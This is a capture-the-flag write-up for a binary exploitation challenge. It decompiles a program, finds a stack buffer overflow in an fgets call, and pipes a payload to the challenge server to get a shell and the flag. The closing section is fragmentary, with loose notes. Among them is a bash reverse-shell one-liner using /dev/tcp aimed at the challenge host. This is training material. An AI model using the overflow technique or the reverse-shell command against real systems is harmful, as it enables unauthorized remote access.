# Chamber of Secrets

## Pwn: 75 points

## Challenge

Enter the secret and get the flag!

`nc challenges.laptophackingcoffee.org 2341`

Credit: Tux#1576

[secret][1]

## Solution

Download the secret file. Check the file type:
```
$ file secret
secret: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de09bbeb8ec1d02060e4f82bcb4dc54ebcec4f53, stripped
```

It's an ELF executable. Add run permissions. Run it:
```
$ chmod +x secret
$ ./secret
Enter the secret: my_secret
You did not pass.
```

Try `strings` and `hexdump`. Nothing interesting:
```
$ strings secret | less
$ hexdump -C secret | less
```

Open the elf file in Ghidra. The function names are all generic. Click through the functions and find one with something interesting like a recognizable string. Below is the discovered main function. Variables have been renamed for readability.
```c
int main(void)
{
  int chamberResult;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  chamberResult = chamberOfSecrets();
  if (chamberResult == 0) {
    printf("You did not pass.");
  }
  else {
    printf("You have passed.");
    system("/bin/sh");
  }
  return 0;
}
```

The `main()` function calls the `chamberOfSecrets()` function and uses the result to allow or disallow access to a shell: `system("/bin/sh")`.

Locate the `chamberOfSecrets()` function. All of the variables are declared at the start of the function. In memory, all of these variables will be right next to each other when they get added onto the stack. 
```c
int chamberOfSecrets(void)
{
  int returnValue;
  char userInput[104];
  int x159;
  int x2a6;
  int x4c;
  int x1ed;
  ...
```

After the declarations, the variables are initialized from `1` to `0x1a` (26 decimal):
```c
  ...
  xea = 1;
  x1282 = 2;
  x7b = 3;
  ...
  x2a6 = 0x19;
  x159 = 0x1a;
  ...
```

After the initializations comes the vulnerability. The `fgets` function pulls in up to `0x100` (256) characters. This is a lot more than the 104 byte buffer for the input: `char userInput[104]`. Therefore, the `fgets` allows the stack to be overwritten.

```c
  printf("Enter the secret: ");
  fgets(userInput, 0x100, stdin);
```

The function then checks for specific values for each of the 26 variables initialized earlier. If all variables match then the function returns `1` and grants access to the shell. Thus the goal is to overflow the input and set the adjacent variables to the expected values.

```c
  if (xea == 0xea && x1282 == 0x1282 && x7b == 0x7b && x21e == 0x21e &&
      x147a2 == 0x147a2 && x7c3 == 0x7c3 && x62 == 0x62 && x0 == 0 && x20 == 0x20 &&
      x463 == 0x463 && x20p2 == 0x20 && x62p2 == 0x62 && x345 == 0x345 && x1d == 0x1d &&
      xe7 == 0xe7 && x3cd == 0x3cd && x1 == 1 && x4fc == 0x4fc && d3000 == 3000 &&
      x17 == 0x17 && x3cc == 0x3cc && x29a == 0x29a && x1ed == 0x1ed && x4c == 0x4c &&
      x2a6 == 0x2a6 && x159 == 0x159)
  {
    returnValue = 1;
  }
  else
  {
    returnValue = 0;
  }
  return returnValue;
}
```

Write a python script to take advantage of this vulnerability. Here are the steps:

1. Overflow the `userInput` var
2. Overwrite the vars following `userInput` with the correct values
3. Take control of the shell

**Step 1: Overflow `userInput`**

Run the program. Enter a bunch of "A"s:
```
$ ./secret
Enter the secret: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

**Segmentation fault**: In computing, a segmentation fault (often shortened to segfault) or access violation is a fault, or failure condition, raised by hardware with memory protection, notifying an operating system the software has attempted to access a restricted area of memory (a memory access violation). -- [Wikipedia](https://en.wikipedia.org/wiki/Segmentation_fault)

The number of "A"s entered caused a segmentation fault, meaning that the program tried to write over a restricted area of memory. 

Compile and examine the [decompiled](decompiled.c) code in gdb:
```
$ gcc decompiled.c -o decompiled
$ gdb decompiled
(gdb) layout asm
(gdb) start
```

Set a breakpoint at the `chamberOfSecrets` function call then step into the function:
```
(gdb) break *main+68
(gdb) continue
Continuing.

Breakpoint 3, 0x0000555555554b70 in main ()
(gdb) si
0x000055555555484a in chamberOfSecrets ()
```


```
(gdb) break *chamberOfSecrets+315
```

```
$ gcc -fno-stack-protector chamber.c -o chamber
```
https://stackoverflow.com/questions/1345670/stack-smashing-detected
```
(gdb) r < payload
Starting program: /home/zionperez/Desktop/playgrounds/lhc/Pwn/ChamberOfSecrets/chamber < payload
*** stack smashing detected ***: <unknown> terminated
```

```
https://stackoverflow.com/questions/1345670/stack-smashing-detected
$ gcc -fno-stack-protector chamber.c -o chamber

$ nc challenges.laptophackingcoffee.org 2341
```


```
bash -i >& /dev/tcp/challenges.laptophackingcoffee.org/2341 0>&1

(python3 script.py ; cat)
```

```
$ cat payload | nc challenges.laptophackingcoffee.org 2341
Enter the secret: You have passed.
```


```
$ (cat payload; cat) | nc challenges.laptophackingcoffee.org 2341
https://www.youtube.com/watch?v=HSlhY4Uy8SA

LHC{y0u_expl0it3d_bu553r_0v3rfl0w!!!}
```


[1]:secret